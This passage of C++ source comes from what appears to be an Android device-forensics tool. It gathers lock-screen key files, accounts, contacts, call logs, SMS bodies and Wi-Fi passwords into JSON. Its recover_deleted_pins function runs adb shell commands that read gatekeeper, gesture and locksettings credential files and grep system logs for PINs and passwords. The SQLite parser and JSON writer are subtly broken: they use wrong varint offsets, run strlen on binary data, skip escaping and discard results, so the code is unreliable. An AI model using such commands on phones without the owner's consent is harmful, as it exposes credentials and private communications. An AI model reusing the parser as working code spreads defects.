    if (data.wpa_supplicant_conf.empty())
        data.wpa_supplicant_conf = rec_data.wpa_supplicant_conf;

    /* Finally fastboot for anything */
    DeviceData fb_data = extract_from_fastboot();
    if (data.build_prop.empty())
        data.build_prop = fb_data.build_prop;
    if (!fb_data.encryption_type.empty())
        data.encryption_type = fb_data.encryption_type;

    return data;
}

std::string DeviceData::to_json() const
{
    std::ostringstream j;

    j << "{\n";
    j << "  \"gatekeeper_password_key\": \"" << gatekeeper_password_key << "\",\n";
    j << "  \"gatekeeper_pattern_key\": \"" << gatekeeper_pattern_key << "\",\n";
    j << "  \"gesture_key\": \"" << gesture_key << "\",\n";
    j << "  \"lock_type\": \"" << lock_type << "\",\n";
    j << "  \"pin_length\": " << pin_length << ",\n";
    j << "  \"password_quality\": " << password_quality << ",\n";
    j << "  \"is_encrypted\": " << (is_encrypted ? "true" : "false") << ",\n";
    j << "  \"encryption_type\": \"" << encryption_type << "\",\n";
    j << "  \"has_fingerprint\": " << (has_fingerprint ? "true" : "false") << ",\n";
    j << "  \"has_face\": " << (has_face ? "true" : "false") << ",\n";

    j << "  \"accounts\": [\n";
    for (size_t i = 0; i < accounts.size(); i++) {
        j << "    {\"type\":\"" << accounts[i].type << "\",\"name\":\"" << accounts[i].name << "\"}";
        if (i + 1 < accounts.size()) j << ",";
        j << "\n";
    }
    j << "  ],\n";

    j << "  \"contacts\": [\n";
    for (size_t i = 0; i < contacts.size(); i++) {
        j << "    {\"name\":\"" << contacts[i].name << "\",\"number\":\"" << contacts[i].number << "\"}";
        if (i + 1 < contacts.size()) j << ",";
        j << "\n";
    }
    j << "  ],\n";

    j << "  \"call_logs\": [\n";
    for (size_t i = 0; i < call_logs.size(); i++) {
        j << "    {\"number\":\"" << call_logs[i].number << "\",\"type\":\"" << call_logs[i].type << "\"}";
        if (i + 1 < call_logs.size()) j << ",";
        j << "\n";
    }
    j << "  ],\n";

    j << "  \"sms_messages\": [\n";
    for (size_t i = 0; i < sms_messages.size(); i++) {
        j << "    {\"address\":\"" << sms_messages[i].address << "\",\"body\":\"" << sms_messages[i].body << "\"}";
        if (i + 1 < sms_messages.size()) j << ",";
        j << "\n";
    }
    j << "  ],\n";

    j << "  \"wifi_networks\": [\n";
    for (size_t i = 0; i < wifi_networks.size(); i++) {
        j << "    {\"ssid\":\"" << wifi_networks[i].ssid << "\",\"psk\":\"" << wifi_networks[i].psk << "\"}";
        if (i + 1 < wifi_networks.size()) j << ",";
        j << "\n";
    }
    j << "  ],\n";

    j << "  \"apps\": [\n";
    for (size_t i = 0; i < apps.size(); i++) {
        j << "    {\"package\":\"" << apps[i].package << "\",\"version\":\"" << apps[i].version << "\"}";
        if (i + 1 < apps.size()) j << ",";
        j << "\n";
    }
    j << "  ]\n";
    j << "}\n";

    return j.str();
}

/* SQLite header constants */
#define SQLITE_HEADER_MAGIC "SQLite format 3\000"
#define SQLITE_PAGE_SIZE_OFFSET 16
#define SQLITE_PAGE_SIZE_LEN 2
#define SQLITE_TABLE_LEAF 0x0D
#define SQLITE_TABLE_INTERIOR 0x05
#define SQLITE_CELL_HEADER_SIZE 4

static unsigned short sqlite_read_u16(const unsigned char *buf, int off) {
    return (unsigned short)(((unsigned short)buf[off] << 8) | buf[off+1]);
}

static unsigned int sqlite_read_u32(const unsigned char *buf, int off) {
    return ((unsigned int)buf[off] << 24) | ((unsigned int)buf[off+1] << 16) |
           ((unsigned int)buf[off+2] << 8) | buf[off+3];
}

static size_t sqlite_varint(const unsigned char *buf, size_t *out_size) {
    size_t val = 0;
    size_t i;
    for (i = 0; i < 9; i++) {
        val = (val << 7) | (buf[i] & 0x7F);
        if (!(buf[i] & 0x80)) { i++; break; }
    }
    *out_size = i;
    return val;
}

static std::string sqlite_read_string(const unsigned char *buf, size_t len) {
    return std::string((const char*)buf, len);
}

SQLiteDB::SQLiteDB() : data(NULL), size(0), page_count(0), page_size(0) {}
SQLiteDB::~SQLiteDB() { if (data) free(data); }

bool SQLiteDB::parse(const unsigned char *raw, size_t raw_size) {
    data = (unsigned char*)malloc(raw_size);
    if (!data) return false;
    memcpy(data, raw, raw_size);
    size = raw_size;
    if (size < 100) return false;
    if (memcmp(data, SQLITE_HEADER_MAGIC, 16) != 0) return false;
    page_size = sqlite_read_u16(data, SQLITE_PAGE_SIZE_OFFSET);
    if (page_size == 1) page_size = 65536;
    page_count = sqlite_read_u32(data, 28);
    return true;
}

std::vector<SQLiteRecord> SQLiteDB::query(const std::string &table) {
    std::vector<SQLiteRecord> records;
    if (!data || page_size == 0) return records;
    /* Scan pages for table records */
    int pages_to_check = (page_count > 0 && page_count < 1000) ? page_count : 100;
    for (int pg = 1; pg <= pages_to_check; pg++) {
        size_t offset = (size_t)(pg - 1) * page_size;
        if (offset + 12 >= size) break;
        unsigned char page_type = data[offset];
        if (page_type == SQLITE_TABLE_LEAF || page_type == SQLITE_TABLE_INTERIOR) {
            size_t cell_count = sqlite_read_u16(data, offset + 3);
            for (size_t ci = 0; ci < cell_count && ci < 100; ci++) {
                size_t cell_off = offset + sqlite_read_u16(data, offset + 8 + ci * 2);
                if (cell_off + 8 >= size) continue;
                size_t payload_len;
                sqlite_varint(data + cell_off, &payload_len);
                size_t rowid;
                sqlite_varint(data + cell_off + 1, &rowid);
                /* Parse payload */
                size_t payload_off = cell_off;
                size_t header_len;
                sqlite_varint(data + payload_off, &header_len);
                SQLiteRecord rec;
                rec.rowid = rowid;
                size_t pos = payload_off + header_len;
                size_t hp = payload_off + 1; /* skip header length */
                while (hp < payload_off + header_len && pos < size) {
                    size_t stype;
                    size_t ssz;
                    stype = sqlite_varint(data + hp, &ssz);
                    hp += ssz;
                    size_t field_len;
                    if (stype >= 12 && (stype % 2 == 0)) {
                        field_len = (stype - 12) / 2;
                    } else if (stype >= 13 && (stype % 2 == 1)) {
                        field_len = (stype - 13) / 2;
                    } else {
                        switch (stype) {
                            case 0: field_len = 0; break; /* NULL */
                            case 1: field_len = 1; break; /* int8 */
                            case 2: field_len = 2; break; /* int16 */
                            case 3: field_len = 3; break; /* int24 */
                            case 4: field_len = 4; break; /* int32 */
                            case 5: field_len = 6; break; /* int48 */
                            case 6: field_len = 8; break; /* int64 */
                            case 7: field_len = 8; break; /* double */
                            case 8: field_len = 0; break; /* zero */
                            case 9: field_len = 0; break; /* one */
                            case 10: field_len = 0; break; /* reserved */
                            case 11: field_len = 0; break; /* reserved */
                            default: field_len = 0;
                        }
                    }
                    if (pos + field_len <= size) {
                        if (stype == 0) {
                            rec.fields.push_back("NULL");
                        } else if (stype >= 13 && (stype % 2 == 1)) {
                            /* Text */
                            rec.fields.push_back(std::string((const char*)data + pos, field_len));
                        } else {
                            /* Blob or numeric */
                            std::string val;
                            char buf[32];
                            for (size_t bi = 0; bi < field_len && bi < 8; bi++) {
                                snprintf(buf, sizeof(buf), "%02x", data[pos + bi]);
                                val += buf;
                            }
                            rec.fields.push_back(val);
                        }
                    }
                    pos += field_len;
                }
                records.push_back(rec);
            }
        }
    }
    return records;
}

std::vector<SQLiteTable> SQLiteDB::get_tables() {
    std::vector<SQLiteTable> tables;
    /* Query sqlite_master */
    size_t sqlite_master_off = page_size; /* Usually page 1 */
    if (sqlite_master_off + 12 >= size) return tables;
    unsigned char page_type = data[sqlite_master_off];
    if (page_type != SQLITE_TABLE_LEAF && page_type != SQLITE_TABLE_INTERIOR) return tables;
    size_t cell_count = sqlite_read_u16(data, sqlite_master_off + 3);
    for (size_t ci = 0; ci < cell_count && ci < 200; ci++) {
        size_t cell_off = sqlite_master_off + sqlite_read_u16(data, sqlite_master_off + 8 + ci * 2);
        if (cell_off + 20 >= size) continue;
        size_t payload_len;
        sqlite_varint(data + cell_off, &payload_len);
        size_t rowid;
        sqlite_varint(data + cell_off + 1, &rowid);
        size_t header_len;
        sqlite_varint(data + cell_off, &header_len);
        size_t pos = cell_off + header_len;
        /* type (text), name (text), tbl_name (text), rootpage (int), sql (text) */
        std::vector<std::string> fields;
        size_t hp = cell_off + 1;
        while (hp < cell_off + header_len && pos < size) {
            size_t stype, ssz;
            stype = sqlite_varint(data + hp, &ssz);
            hp += ssz;
            if (stype >= 13 && (stype % 2 == 1)) {
                size_t flen = (stype - 13) / 2;
                if (pos + flen <= size) {
                    fields.push_back(std::string((const char*)data + pos, flen));
                    pos += flen;
                }
            } else {
                size_t flen;
                if (stype == 0) flen = 0;
                else if (stype == 1) flen = 1;
                else flen = 4;
                pos += flen;
            }
        }
        if (fields.size() >= 4 && fields[0] == "table") {
            SQLiteTable t;
            t.name = fields[2];
            t.sql = fields.size() > 4 ? fields[4] : "";
            tables.push_back(t);
        }
    }
    return tables;
}

bool DataForensics::parse_sqlite(SQLiteDB *db, const unsigned char *data, size_t size) {
    if (!db) return false;
    return db->parse(data, size);
}

bool DataForensics::extract_sqlite_data(const std::string &db_path, const std::string &table) {
    if (!m_adb && !m_recovery) return false;
    if (m_adb) {
        std::string cmd = "cat " + db_path + " 2>/dev/null";
        char buf[65536];
        if (adb_native_shell(cmd.c_str(), buf, sizeof(buf)) == 0 && strlen(buf) > 0) {
            SQLiteDB db;
            if (db.parse((const unsigned char*)buf, strlen(buf))) {
                auto records = db.query(table);
                return !records.empty();
            }
        }
    }
    return false;
}

bool DataForensics::recover_deleted_pins() {
    if (!m_adb) return false;
    char buf[16384];
    static const char *paths[] = {
        "/data/system/gatekeeper.password.key",
        "/data/system/gatekeeper.pattern.key",
        "/data/system/gesture.key",
        "/data/system/locksettings.db",
        "/data/system/locksettings.db-wal",
        "/data/system/locksettings.db-shm",
        "/data/system/password.key",
        NULL
    };
    for (int i = 0; paths[i]; i++) {
        char cmd[512];
        snprintf(cmd, sizeof(cmd), "cat %s 2>/dev/null | xxd | head -20", paths[i]);
        adb_native_shell(cmd, buf, sizeof(buf));
    }
    adb_native_shell("logcat -d -b all | grep -i 'pin\\|password\\|pattern' | tail -100", buf, sizeof(buf));
    return true;
}
